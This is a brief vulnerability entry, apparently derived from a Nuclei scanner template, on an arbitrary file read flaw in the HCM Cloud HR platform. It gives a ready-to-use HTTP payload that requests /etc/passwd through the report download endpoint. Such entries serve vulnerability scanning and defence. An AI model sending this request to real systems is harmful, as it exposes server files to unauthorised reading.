# Vulnerability: HCM Cloud - Arbitrary File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`hcm-cloud-lfi.yaml`)

## Description
HCM-Cloud professional human resources platform in the cloud download Arbitrary file read vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api/model_report/file/download?index=/&ext=/etc/passwd
```

